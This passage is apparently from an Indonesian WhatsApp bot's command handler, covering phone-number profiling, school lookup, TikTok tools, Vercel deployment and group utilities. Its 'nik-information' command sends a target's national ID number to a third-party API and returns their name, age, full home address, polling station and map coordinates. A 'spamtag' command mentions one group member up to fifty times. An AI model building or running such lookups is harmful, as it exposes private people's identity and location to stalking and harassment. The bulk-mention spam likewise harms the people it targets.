  "239": "Sao Tome dan Principe",
  "240": "Guinea Equatorial",
  "241": "Gabon",
  "242": "Republik Kongo",
  "243": "Republik Demokratik Kongo",
  "244": "Angola",
  "245": "Guinea-Bissau",
  "246": "British Indian Ocean Territory",
  "247": "Ascension",
  "248": "Seychelles",
  "249": "Sudan",
  "250": "Rwanda",
  "251": "Ethiopia",
  "252": "Somalia",
  "253": "Djibouti",
  "254": "Kenya",
  "255": "Tanzania",
  "256": "Uganda",
  "257": "Burundi",
  "258": "Mozambik",
  "259": "Zambia",
  "260": "Zimbabwe",
  "261": "Madagaskar",
  "262": "Reunion",
  "263": "Zimbabwe",
  "264": "Namibia",
  "265": "Malawi",
  "266": "Lesotho",
  "267": "Botswana",
  "268": "Eswatini",
  "269": "Komoros",
  "290": "Saint Helena",
  "291": "Eritrea",
  "297": "Aruba",
  "298": "Faroe",
  "299": "Greenland",
  "350": "Gibraltar",
  "351": "Portugal",
  "352": "Luksemburg",
  "353": "Irlandia",
  "354": "Islandia",
  "355": "Albania",
  "356": "Malta",
  "357": "Siprus",
  "358": "Finlandia",
  "359": "Bulgaria",
  "370": "Lithuania",
  "371": "Latvia",
  "372": "Estonia",
  "373": "Moldova",
  "374": "Armenia",
  "375": "Belarus",
  "376": "Andorra",
  "377": "Monako",
  "378": "San Marino",
  "379": "Vatikan",
  "380": "Ukraina",
  "381": "Serbia",
  "382": "Montenegro",
  "385": "Kroasia",
  "386": "Slovenia",
  "387": "Bosnia dan Herzegovina",
  "389": "Makedonia Utara",
  "420": "Ceko",
  "421": "Slowakia",
  "423": "Liechtenstein",
  "500": "Falkland",
  "501": "Belize",
  "502": "Guatemala",
  "503": "El Salvador",
  "504": "Honduras",
  "505": "Nicaragua",
  "506": "Kosta Rika",
  "507": "Panama",
  "508": "Saint-Pierre dan Miquelon",
  "509": "Haiti",
  "590": "Guadeloupe",
  "591": "Bolivia",
  "592": "Guyana",
  "593": "Ekuador",
  "594": "Guyana Perancis",
  "595": "Paraguay",
  "596": "Martinique",
  "597": "Suriname",
  "598": "Uruguay",
  "599": "Curacao",
  "670": "Timor Leste",
  "671": "Guam",
  "672": "Norfolk",
  "673": "Brunei",
  "674": "Nauru",
  "675": "Papua Nugini",
  "676": "Tonga",
  "677": "Kepulauan Solomon",
  "678": "Vanuatu",
  "679": "Fiji",
  "680": "Palau",
  "681": "Wallis dan Futuna",
  "682": "Kepulauan Cook",
  "683": "Niue",
  "685": "Samoa",
  "686": "Kiribati",
  "687": "Kaledonia Baru",
  "688": "Tuvalu",
  "689": "Polinesia Perancis",
  "690": "Tokelau",
  "691": "Mikronesia",
  "692": "Kepulauan Marshall",
  "850": "Korea Utara",
  "852": "Hong Kong",
  "853": "Makau",
  "855": "Kamboja",
  "856": "Laos",
  "960": "Maldives",
  "961": "Lebanon",
  "962": "Yordania",
  "963": "Suriah",
  "964": "Irak",
  "965": "Kuwait",
  "966": "Arab Saudi",
  "967": "Yemen",
  "968": "Oman",
  "970": "Palestina",
  "971": "Uni Emirat Arab",
  "972": "Israel",
  "973": "Bahrain",
  "974": "Qatar",
  "975": "Bhutan",
  "976": "Mongolia",
  "977": "Nepal",
  "979": "International Freephone",
  "980": "International Freephone",
  "981": "International Freephone",
  "982": "International Freephone",
  "983": "International Freephone",
  "984": "International Freephone",
  "985": "International Freephone",
  "986": "International Freephone",
  "987": "International Freephone",
  "988": "International Freephone",
  "989": "International Freephone"
 };

  let negara = "Tidak diketahui";
  for (const code of Object.keys(countries).sort((a,b)=>b.length-a.length)) {
    if (nomor.startsWith(code)) {
      negara = countries[code];
      break;
    }
  }

  // ===== OPERATOR =====
  let operator = "Tidak diketahui";

  if (negara === "Indonesia") {
    const prefix = nomor.slice(0, 5);
    const operators = {
  Telkomsel: ["62811", "62812", "62813", "62821", "62822", "62823", "62851", "62852", "62853"],
  Indosat: ["62814", "62815", "62816", "62855", "62856", "62857", "62858"],
  XL: ["62817", "62818", "62819", "62859", "62877", "62878"],
  Axis: ["62831", "62832", "62833", "62838"],
  Tri: ["62895", "62896", "62897", "62898", "62899"],
  Smartfren: ["62881", "62882", "62883", "62884", "62885", "62886", "62887", "62888", "62889"],
  ByU: ["62851"]
    };

    for (const [name, list] of Object.entries(operators)) {
      if (list.includes(prefix)) {
        operator = name;
        break;
      }
    }
  } else {
    operator = "Tidak didukung (non-ID)";
  }

  // ===== PUBLIC PROFILE =====
  let accountType = "-";
  let about = "-";
  let photoProfile = "Tidak tersedia";
  let businessInfo = "";
  let locationInfo = "";

  if (isActive) {
    try {
      const status = await conn.fetchStatus(jid);
      if (status?.status) about = status.status;
    } catch {}

    try {
      const pp = await conn.profilePictureUrl(jid, "image");
      if (pp) photoProfile = "Tersedia";
    } catch {}

    try {
      const biz = await conn.getBusinessProfile(jid);
      if (biz) {
        accountType = "WhatsApp Business";

        businessInfo =
          `🏢 Nama Bisnis: ${biz.businessName || "-"}\n` +
          `🗂️ Kategori: ${biz.category || "-"}\n` +
          `📄 Deskripsi: ${biz.description || "-"}`;

        if (biz.latitude && biz.longitude) {
          locationInfo =
            `📍 Lokasi Bisnis:\n` +
            `• Latitude: ${biz.latitude}\n` +
            `• Longitude: ${biz.longitude}\n` +
            `• Maps: https://maps.google.com/?q=${biz.latitude},${biz.longitude}`;
        } else if (biz.address) {
          locationInfo =
            `📍 Alamat Bisnis:\n` +
            `${biz.address}`;
        }
      } else {
        accountType = "Personal";
      }
    } catch {
      accountType = "Personal";
    }
  }

  // ===== OUTPUT =====
  Reply(
    `📞 *INFORMASI NOMOR*\n\n` +
    `🔢 Nomor: ${nomor}\n` +
    `🌍 Negara: ${negara}\n` +
    `📡 Operator: ${operator}\n` +
    `📲 Status WhatsApp: ${waStatus}\n` +
    `👤 Tipe Akun: ${accountType}\n` +
    `📝 About: ${about}\n` +
    `🖼️ Foto Profil: ${photoProfile}\n` +
    (businessInfo ? `\n${businessInfo}` : "") +
    (locationInfo ? `\n\n${locationInfo}` : "") +
    `\n\n⚠️ Data diambil dari informasi publik WhatsApp`
  );
}

break;
case "school-track": {
  if (!q) return Reply(`🏫 *School Tracker*\n\nFormat: .schooltrack nama sekolah | kota\nContoh: .schooltrack sman 1 | jakarta`);

  const [namaSekolah, daerah] = text.split('|').map(str => str.trim());
  if (!namaSekolah || !daerah) return Reply('❌ Format salah!');

  const statusMsg = await Reply(`🔍 Mencari: ${namaSekolah} di ${daerah}...`);

  const apis = [
    `https://api-sekolah-indonesia.vercel.app/sekolah?s=${encodeURIComponent(namaSekolah)}&kab=${encodeURIComponent(daerah)}`,
    `https://data.sekolah-kita.net/sekolah/${encodeURIComponent(namaSekolah)}/${encodeURIComponent(daerah)}`,
    `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://dapo.kemdikbud.go.id/api/search?q=${namaSekolah}&kab=${daerah}`)}`
  ];

  let schoolData = null;
  let apiUsed = "";

  for (const apiUrl of apis) {
    try {
      const response = await fetch(apiUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
        timeout: 10000
      });

      if (response.ok) {
        const data = await response.json();
        
        if (data && (data.data || data.sekolah || data.result)) {
          schoolData = data.data || data.sekolah || data.result;
          apiUsed = apiUrl.includes('vercel.app') ? "API Sekolah Indonesia" : 
                   apiUrl.includes('sekolah-kita') ? "Sekolah Kita" : "Dapodik Kemdikbud";
          break;
        }
      }
    } catch (error) {
      continue;
    }
  }

  if (!schoolData || (Array.isArray(schoolData) && schoolData.length === 0)) {
    await conn.sendMessage(m.chat, {
      edit: statusMsg.key,
      text: `❌ Data tidak ditemukan untuk "${namaSekolah}" di ${daerah}`
    });
    return;
  }

  const sekolah = Array.isArray(schoolData) ? schoolData[0] : schoolData;
  
  let info = `🏫 *DATA SEKOLAH TERVERIFIKASI*\n\n`;
  info += `📛 *Nama:* ${sekolah.nama_sekolah || sekolah.nama || 'Tidak tersedia'}\n`;
  info += `🆔 *NPSN:* ${sekolah.npsn || 'Tidak tersedia'}\n`;
  info += `📍 *Alamat:* ${sekolah.alamat || sekolah.alamat_jalan || 'Tidak tersedia'}\n`;
  info += `🏙️ *Kecamatan:* ${sekolah.kecamatan || 'Tidak tersedia'}\n`;
  info += `🌆 *Kabupaten/Kota:* ${sekolah.kabupaten || sekolah.kab || daerah}\n`;
  info += `📍 *Provinsi:* ${sekolah.provinsi || 'Tidak tersedia'}\n`;
  info += `📞 *Telepon:* ${sekolah.telepon || sekolah.no_telp || 'Tidak tersedia'}\n`;
  info += `📧 *Email:* ${sekolah.email || 'Tidak tersedia'}\n`;
  info += `🌐 *Website:* ${sekolah.website || 'Tidak tersedia'}\n`;
  info += `🏛️ *Status:* ${sekolah.status_sekolah || sekolah.status || 'Tidak tersedia'}\n`;
  info += `📊 *Jenjang:* ${sekolah.jenjang_pendidikan || sekolah.bentuk_pendidikan || 'Tidak tersedia'}\n\n`;
  
  if (sekolah.akreditasi) {
    info += `⭐ *Akreditasi:* ${sekolah.akreditasi}\n`;
  }
  
  if (sekolah.latitude && sekolah.longitude) {
    info += `🗺️ *Koordinat:* ${sekolah.latitude}, ${sekolah.longitude}\n`;
  }
  
  info += `\n📡 *Sumber:* ${apiUsed}\n`;
  info += `🔍 *Pencarian:* ${namaSekolah} | ${daerah}\n`;
  info += `⏰ *Update:* ${new Date().toLocaleDateString('id-ID')}`;

  const mapUrl = sekolah.latitude && sekolah.longitude 
    ? `https://maps.google.com/maps?q=${sekolah.latitude},${sekolah.longitude}&z=17&hl=id`
    : `https://maps.google.com/maps?q=${encodeURIComponent(sekolah.alamat + ', ' + daerah)}&hl=id`;

  await conn.sendMessage(m.chat, {
    edit: statusMsg.key,
    text: info,
    contextInfo: {
      externalAdReply: {
        title: `🏫 ${sekolah.nama_sekolah || sekolah.nama || 'Sekolah'}`,
        body: `📍 ${sekolah.kabupaten || daerah} | 🆔 ${sekolah.npsn || 'NPSN'}`,
        mediaType: 1,
        thumbnail: await (await fetch('https://api.dicebear.com/7.x/shapes/png?seed=school')).buffer(),
        mediaUrl: mapUrl,
        sourceUrl: mapUrl
      }
    }
  });

  if (Array.isArray(schoolData) && schoolData.length > 1) {
    setTimeout(async () => {
      await Reply(`📚 Ditemukan ${schoolData.length} sekolah serupa. Gunakan filter lebih spesifik untuk hasil tepat.`);
    }, 1000);
  }
}

break;
case "getcode": {
  const messType = m.quoted ? { [m.quoted.mtype]:m.quoted } : { [m.mtype]:m.message };
  const formattedJson = JSON.stringify(messType, null, 2);
  conn.relayMessage(m.chat, {
    "extendedTextMessage": {
      "text": formattedJson 
    }
  }, {});
}

break;

case 'nik-information': {
    if (!isPremium)
        return Reply("𝐒𝐎𝐑𝐑𝐘 𝐋𝐔 𝐉𝐄𝐋𝐄𝐊 𝐉𝐀𝐃𝐈 𝐆𝐀 𝐃𝐀𝐏𝐄𝐓 𝐀𝐊𝐒𝐄𝐒");

    if (!q)
        return Reply(
            "📌 Masukkan NIK target!\n\nContoh:\n.nik-perse 3202285909840005"
        );

    const nik = q.trim();

    try {
        Reply("🔍 Sedang Mencari Data Dari NIK Tersebut");

        const res = await fetch("https://api.siputzx.my.id/api/tools/nik-checker", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ nik })
        });

        const json = await res.json();

        if (!json.status || !json.data?.data) {
            return Reply("❌ NIK tidak valid atau data tidak ditemukan.");
        }

        const d = json.data.data;
        const coord = d.koordinat || {};

        const hasil = `
📑 𝐃𝐀𝐓𝐀

• NIK: ${json.data.nik || nik}
• Nama: ${d.nama || "-"}
• Jenis Kelamin: ${d.kelamin || "-"}
• Tempat Lahir: ${d.tempat_lahir || "-"}
• Usia: ${d.usia || "-"}
• Zodiak: ${d.zodiak || "-"}
• Ultah Mendatang: ${d.ultah_mendatang || "-"}
• Pasaran: ${d.pasaran || "-"}

🏠 *Alamat*
• Provinsi: ${d.provinsi || "-"}
• Kabupaten: ${d.kabupaten || "-"}
• Kecamatan: ${d.kecamatan || "-"}
• Kelurahan: ${d.kelurahan || "-"}
• TPS: ${d.tps || "-"}
• Detail: ${d.alamat || "-"}

📍 *Koordinat*
• Latitude: ${coord.lat || "-"}
• Longitude: ${coord.lon || "-"}
${coord.lat && coord.lon
    ? `• Maps: https://www.google.com/maps/search/?api=1&query=${coord.lat},${coord.lon}`
    : ""}

        `.trim();

        Reply(hasil);

    } catch (err) {
        console.error("NIK PERSE ERROR:", err);
        Reply("❌ Gagal memproses NIK");
    }
}

break;

case "search-username": {
  if (!q) return Reply("Usernamenya mana. Internet bukan cenayang.");

  const username = q.trim();

  const platforms = {
    Instagram: `https://www.instagram.com/${username}`,
    TikTok: `https://www.tiktok.com/@${username}`,
    Twitter: `https://twitter.com/${username}`,
    GitHub: `https://github.com/${username}`,
    Facebook: `https://www.facebook.com/${username}`,
    YouTube: `https://www.youtube.com/@${username}`,
    Reddit: `https://www.reddit.com/user/${username}`,
    Telegram: `https://t.me/${username}`,
  };

  let teks = `🔍 *Username Search Result*\nUsername: ${username}\n\n`;

  for (const [name, url] of Object.entries(platforms)) {
    teks += `• ${name}: ${url}\n`;
  }

  Reply(teks);
}

break;

//STOOP TOOLSMENU
case "swdl2": case "getsw": {
        if (!isOwner) return Reply(msg.owner)
        
        if (!m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
        return conn.sendMessage(from, { text: "Reply ke status (story) yang ingin kamu download!" }, { quoted: lol });
        }
      
       const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
       
       let mediaType = null;
       let mediaMessage = null;
       await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
       if (quoted.imageMessage) {
           mediaType = "image";
           mediaMessage = quoted.imageMessage;
       } else if (quoted.videoMessage) {
           mediaType = "video";
           mediaMessage = quoted.videoMessage;
       } else {
       return conn.sendMessage(m.chat, { text: "Story yang diReply bukan gambar atau video." }, { quoted: m });
       }
      
       try {
           const stream = await downloadContentFromMessage(mediaMessage, mediaType);
           let buffer = Buffer.from([]);
          
           for await (const chunk of stream) {
           buffer = Buffer.concat([buffer, chunk]);
           }
          
           await conn.sendMessage(m.chat, {
           [mediaType]: buffer,
           caption: "Berhasil mendownload story!"
           }, { quoted: m });
      
       } catch (err) {
       console.error("Gagal download story:", err);
       await conn.sendMessage(from, { text: "Terjadi kesalahan saat download story." }, { quoted: m });
       }
    }
    break
    case "copy": {
    if (!m.isGroup) return Reply("Command ini cuma bisa dipakai di grup 👥");

    // pastikan user membalas pesan
    if (!quoted || !quoted.sender) return Reply("Reply pesan orang yang ingin di-copy nomornya!");

    // ambil nomor user yang di-Reply
    let nomor = quoted.sender.split('@')[0];

    let teks = `🟢 Nomor User\n╰┈➤ *${nomor}*`;

    // Buat pesan interaktif persis style copyme
    let msgii = await generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessageV2Extension: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_copy",
                                    "buttonParamsJson": `{
                                        "display_text":"SALIN NOMOR",
                                        "id":"copy_number",
                                        "copy_code":"${nomor}"
                                    }`
                                },
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": `{
                                        "display_text":"CHAT NOMOR",
                                        "url":"https://wa.me/${nomor}"
                                    }`
                                }
                            ]
                        })
                    })
                }
            }
        },
        { userJid: m.sender, quoted: m }
    );

    // Kirim pesan
    await conn.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
}
break;
case "copyme": {
    if (!m.isGroup) return Reply("Command ini cuma bisa dipakai di grup 👥");

    let nomor = m.sender.split('@')[0]; // ambil nomor tanpa @

    let teks = `🟢 Nomor Kamu\n╰┈➤ *${nomor}*`;

    // Buat pesan interaktif persis style cekidch
    let msgii = await generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessageV2Extension: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_copy",
                                    "buttonParamsJson": `{
                                        "display_text":"SALIN NOMOR",
                                        "id":"copy_number",
                                        "copy_code":"${nomor}"
                                    }`
                                },
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": `{
                                        "display_text":"CHAT NOMOR",
                                        "url":"https://wa.me/${nomor}"
                                    }`
                                }
                            ]
                        })
                    })
                }
            }
        },
        { userJid: m.sender, quoted: m }
    );

    // Kirim pesan
    await conn.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
}
break;
case 'tag':
case 'spamtag': {
    if (!isCreator) return Reply(mess.owner)
    if (!m.isGroup) return Reply('Command ini cuma bisa dipakai di grup 👥');

    if (!text) return Reply(`Contoh penggunaan:\n${prefix}tag @agus 10 *(maksimal 50)*`);

    let [mentionText, countText] = text.split(' ');
    if (!mentionText.startsWith('@')) return Reply('Harus tag user pakai @');

    let count = parseInt(countText) || 1;
    if (count > 50) count = 50;

    // Ambil participant dari group metadata
    let participants = m.metadata?.participants || [];
    let target = participants.find(p => {
        let jidNum = p.id.split('@')[0];
        return jidNum === mentionText.replace('@', '');
    });

    if (!target) return Reply('User tidak ditemukan di grup!');

    // Kirim pesan
    for (let i = 0; i < count; i++) {
        await conn.sendMessage(
            m.chat,
            {
                text: `Hai @${target.id.split('@')[0]}! Ini mention ke-${i+1}`,
                mentions: [target.id]
            },
            { quoted: m }
        );
    }

    Reply(`✅ Selesai menandai @${target.id.split('@')[0]} sebanyak ${count} kali`);
}
break;
case "antilink":
    case "antilink2":
        if (!isGroup) return;
        if (!isAdmins) return;
        if (!isBotAdmins) return;
    
        let isKick = command === "antilink2";
        let db = isKick ? AntiLinkKick : antilinkGroups;
        let dbFile = isKick ? './library/database/antilink2.json' : './library/database/antilink.json';
    
        if (args[0] === "on") {
            if (db.includes(m.chat)) return Reply(`✅ ${command} sudah aktif!`);
            db.push(m.chat);
            fs.writeFileSync(dbFile, JSON.stringify(db));
            Reply(`✅ ${command} telah diaktifkan!`);
        } else if (args[0] === "off") {
            if (!db.includes(m.chat)) return Reply(`❌ ${command} belum diaktifkan.`);
            db.splice(db.indexOf(m.chat), 1);
            fs.writeFileSync(dbFile, JSON.stringify(db));
            Reply(`❌ ${command} telah dinonaktifkan!`);
        } else {
            Reply(`⚠️ Gunakan:\n- *.${command} on* untuk mengaktifkan\n- *.${command} off* untuk menonaktifkan`);
        }
      break
      case 'lazada':
case 'laz':
case 'slazada':
    await LazadaSearch(m, { conn, text, prefix, command });
    break
case 'tiktokptv': {
    await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    if (!args[0]) return Reply(`${noticenya} Contoh: ${prefix + command} link lu *maksimal vd 60 detik*`);

    try {
        // Ambil video TikTok
        let res = await tiktok2(`${args[0]}`);

        // Kirim video PTV (bulat)
        await conn.sendMessage(m.chat, {
            video: { url: res.no_watermark },
            fileName: `tiktokptv.mp4`,
            mimetype: 'video/mp4',
            ptv: true
        }, { quoted: m });

    } catch (err) {
        console.log(err);
        Reply('Gagal mendownload video, pastikan link TikTok valid');
    }
}
break
case 'toptv': {
  const { downloadContentFromMessage } = require('@whiskeysockets/baileys')

  const type = Object.keys(m.message || {})[0]
  const context = m.message?.[type]?.contextInfo

  if (!context?.quotedMessage)
    return Reply('Reply videonya dengan .toptv')

  const quoted = context.quotedMessage
  const qType = Object.keys(quoted)[0]

  if (qType !== 'videoMessage')
    return Reply('Itu bukan video')

  const duration = quoted.videoMessage?.seconds || 0

  if (duration > 60)
    return Reply(`❌ Video terlalu panjang (${duration} detik).
Maksimal 60 detik.`)

  // 🔥 DOWNLOAD MEDIA (cara baru)
  const stream = await downloadContentFromMessage(
    quoted.videoMessage,
    'video'
  )

  let buffer = Buffer.from([])
  for await (const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
  }

  await conn.sendMessage(m.chat, {
    video: buffer,
    ptv: true
  }, { quoted: m })
}
break
case 'togif': 
case 'gif': {
    if (!quoted) return Reply('Reply videonya dengan caption *.togif*')
    if (!/video/.test(mime)) return m.Eeply('Itu bukan video!')
    
    Reply('⏳ Sedang mengubah video ke GIF...')

    let media = await quoted.download()
    
    await conn.sendMessage(m.chat, {
        video: media,
        gifPlayback: true,
        caption: '✅ Nih GIF nya!'
    }, { quoted: m })

}
break
case 'remini': {
if (!m.quoted) return Reply("Reply gambar dengan command .remini")

let mime = m.quoted.mimetype || ""
if (!mime.includes("image")) return Reply("Harus reply gambar!")

let media = await conn.downloadAndSaveMediaMessage(m.quoted)

await conn.sendMessage(m.chat,{ react:{ text:"⏳", key:m.key }})

let res = await fetch(`https://api.agatz.xyz/api/remini?url=${media}`)
let json = await res.json()

await conn.sendMessage(m.chat,{
image: { url: json.data },
caption: "✨ Remini Result"
},{ quoted: m })

}
break
case "ttstalk": {
if (!q) return Reply("Masukkan username TikTok!")

let res = await fetch(`https://tikwm.com/api/user/info?unique_id=${q}`)
let json = await res.json()

let u = json.data.user

let teks = `
👤 Username : ${u.unique_id}
📛 Nickname : ${u.nickname}
👥 Followers : ${u.follower_count}
❤️ Likes : ${u.total_favorited}
🎬 Video : ${u.aweme_count}
`

await conn.sendMessage(m.chat,{
image: { url: u.avatar_larger },
caption: teks
},{ quoted: m })

}
break
case 'trendtt':
case 'tttrend': {
try {

let res = await fetch("https://tikwm.com/api/feed/list")
let json = await res.json()

if (!json.data || !json.data.length) {
return Reply("Tidak bisa mengambil video trending")
}

let vid = json.data[0]

await conn.sendMessage(m.chat, {
video: { url: vid.play },
caption: `🔥 *TikTok Trending*

📌 Title : ${vid.title || "-"}
👤 Author : ${vid.author?.nickname || vid.author || "-"}`
}, { quoted: m })

} catch (err) {
console.log(err)
Reply("Terjadi error saat mengambil data TikTok")
}

}
break
//website
case "delweb": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply('📌 Contoh:\n.delweb namaproject')
    if (!global.vercelToken) return Reply('❌ Token Vercel belum diset!')

    const webName = text.trim().toLowerCase()

    let msg = await Reply(`⏳ Menghapus *${webName}*...`)

    try {
        let res = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
            method: "DELETE",
            headers: {
                Authorization: `Bearer ${global.vercelToken}`
            }
        })

        if (res.status === 200 || res.status === 204) {
            return conn.sendMessage(m.chat, {
                text: `✅ Website *${webName}* berhasil dihapus!`,
                edit: msg.key
            })
        } else if (res.status === 404) {
            return conn.sendMessage(m.chat, {
                text: `⚠️ Website tidak ditemukan!`,
                edit: msg.key
            })
        } else {
            return conn.sendMessage(m.chat, {
                text: `❌ Gagal hapus website!`,
                edit: msg.key
            })
        }

    } catch (e) {
        console.log(e)
        conn.sendMessage(m.chat, {
            text: `❌ Error saat hapus!`,
            edit: msg.key
        })
    }
}
break;
case "gethtml": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply("❗ Masukkan domain atau URL");

    try {
        let res = await fetch(text);
        if (!res.ok) return m.reply("❌ Gagal mengambil data dari URL tersebut");
        let html = await res.text();

        // pastikan folder ada
        const dirPath = path.join(__dirname, "./library/database/sampah/html_dump.html");
        if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });

        const filePath = path.join(dirPath, "html_dump.html");
        fs.writeFileSync(filePath, html);

        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: "text/html",
            fileName: "source.html"
        }, { quoted: m });

        fs.unlinkSync(filePath); // hapus setelah terkirim
    } catch (e) {
        console.error(e);
        Reply("❌ Terjadi kesalahan saat mengambil HTML\n" + e.message);
    }
}
break;
case "listweb": {
    if (!isCreator) return Reply(mess.owner)
    if (!global.vercelToken) return Reply('❌ Token Vercel belum diset!')

    try {
        let res = await fetch('https://api.vercel.com/v9/projects', {
            headers: {
                Authorization: `Bearer ${global.vercelToken}`
            }
        })

        let json = await res.json()

        if (!json.projects || json.projects.length === 0) {
            return Reply('📭 Tidak ada website!')
        }

        let teks = `🌐 *LIST WEBSITE KELPIN*\n\n`

        json.projects.forEach((v, i) => {
            teks += `${i+1}. ${v.name}\n`
            teks += `🔗 https://${v.name}.vercel.app\n\n`
        })

        Reply(teks)

    } catch (e) {
        console.log(e)
        Reply('❌ Gagal mengambil data!')
    }
}
break;
case "infoweb": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply('📌 Contoh:\n.infoweb namaproject')
    if (!global.vercelToken) return Reply('❌ Token belum diset!')

    const webName = text.trim().toLowerCase()

    try {
        let res = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
            headers: {
                Authorization: `Bearer ${global.vercelToken}`
            }
        })

        // ❌ kalau project gak ada / udah dihapus
        if (res.status === 404) {
            return Reply(`⚠️ *${webName}* tidak ditemukan / sudah dihapus!`)
        }

        let json = await res.json()

        // 🔍 cek status online (akses domain)
        let statusWeb = "❌ Offline"
        try {
            let cek = await fetch(`https://${webName}.vercel.app`)
            if (cek.status === 200) statusWeb = "✅ Online"
        } catch {}

        Reply(`📊 *INFO WEB KELPIN*

📦 Nama: ${json.name}
🆔 ID: ${json.id}
⏰ Dibuat: ${new Date(json.createdAt).toLocaleString()}
🌐 https://${json.name}.vercel.app
⚡ Status: ${statusWeb}`)
        
    } catch (e) {
        console.log(e)
        Reply('❌ Gagal ambil info!')
    }
}
break;
case "cekweb": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply('📌 Contoh:\n.cekweb namaproject')

    const webName = text.trim().toLowerCase()
    const url = `https://${webName}.vercel.app`

    try {
        let res = await fetch(url)

        if (res.status === 200) {
            Reply(`🌐 *CEK WEBSITE*

🔗 ${url}
⚡ Status: ✅ Online`)
        } else {
            Reply(`🌐 *CEK WEBSITE*

🔗 ${url}
⚠️ Status: ❌ Tidak normal (${res.status})`)
        }

    } catch (e) {
        Reply(`🌐 *CEK WEBSITE*

🔗 ${url}
❌ Status: Offline / Tidak bisa diakses`)
    }
}
break;
case "historyweb": {
    if (!isCreator) return Reply(mess.owner)
    if (!global.vercelToken) return Reply('❌ Token belum diset!')

    try {
        let res = await fetch('https://api.vercel.com/v6/deployments', {
            headers: {
                Authorization: `Bearer ${global.vercelToken}`
            }
        })

        let json = await res.json()

        let teks = '📜 *DEPLOY HISTORY*\n\n'

        json.deployments.slice(0,5).forEach((v,i) => {
            teks += `${i+1}. ${v.name}\n`
            teks += `⚡ ${v.state}\n`
            teks += `🌐 https://${v.url}\n\n`
        })

        Reply(teks)

    } catch (e) {
        Reply('❌ Gagal ambil history')
    }
}
break;
case "deployweb": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply('📌 Contoh:\n.deployweb kelpin-web')
    if (!m.quoted) return Reply('❗ Reply file .zip / .html')
    if (!global.vercelToken) return Reply('❌ Token Vercel belum diset!')

    const qmsg = m.quoted
    const mime = qmsg.mimetype || qmsg.msg?.mimetype || ''
    if (!/zip|html/.test(mime)) return Reply('❌ Format harus .zip / .html')

    const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '')

    // 🔥 kirim 1 pesan awal
    let msg = await conn.sendMessage(m.chat, {
        text: `⏳ *Memulai deploy...*`
    }, { quoted: m })

    // fungsi edit
    const edit = async (teks) => {
        await conn.sendMessage(m.chat, {
            text: teks,
            edit: msg.key
        })
    }

    let buffer
    try {
        await edit('📥 Mengambil file...')
        buffer = await qmsg.download()
    } catch {
        return edit('❌ Gagal ambil file!')
    }

    let files = []

    // 🔥 ZIP
    if (mime.includes('zip')) {
        await edit('📦 Mengekstrak file ZIP...')

        const unzipper = require('unzipper')
        const dir = await unzipper.Open.buffer(buffer)

        for (let file of dir.files) {
            if (file.type !== 'File') continue
            let content = await file.buffer()

            files.push({
                file: file.path,
                data: content.toString('base64'),
                encoding: 'base64'
            })
        }

        if (!files.some(v => v.file.toLowerCase().endsWith('index.html')))
            return edit('❌ index.html tidak ditemukan!')
    }

    // 🔥 HTML
    if (mime.includes('html')) {
        await edit('📄 Memproses HTML...')

        files.push({
            file: 'index.html',
            data: buffer.toString('base64'),
            encoding: 'base64'
        })
    }

    const headers = {
        Authorization: `Bearer ${global.vercelToken}`,
        'Content-Type': 'application/json'
    }

    // 🔥 CREATE PROJECT
    await edit('⚙️ Membuat project...')
    await fetch('https://api.vercel.com/v9/projects', {
        method: 'POST',
        headers,
        body: JSON.stringify({ name: webName })
    }).catch(() => {})

    // 🔥 DEPLOY
    await edit('🚀 Mengupload & deploy...')
    const res = await fetch('https://api.vercel.com/v13/deployments', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            name: webName,
            project: webName,
            files,
            projectSettings: { framework: null }
        })
    })

    const json = await res.json()

    if (!json.url) return edit('❌ Deploy gagal!')

    // 🔥 DONE
    await edit(`✅ *KELPIN OFFICIAL WEB*

🌐 https://${webName}.vercel.app
⚡ Status: Online
🚀 Deploy Selesai`)
}
break;
case 'carivt':
case 'ttsearch': {
if (!q) return Reply("Masukkan kata kunci!")

let res = await fetch(`https://api.agatz.xyz/api/tiktoksearch?message=${q}`)
let data = await res.json()

let vid = data.data[0]

await conn.sendMessage(m.chat, {
video: { url: vid.play },
caption: `*TikTok Search*\n\nTitle: ${vid.title}\nAuthor: ${vid.author.nickname}`
}, { quoted: m })

}
break
// Case untuk menampilkan list produk
case "lisproduk":
case "listproduk": {
    if (!isCreator) return Reply(mess.owner)
    
    if (!global.listProduk || global.listProduk.length === 0)
        return Reply("⚠️ Belum ada daftar produk. Silakan set di setting.js dulu.")
    
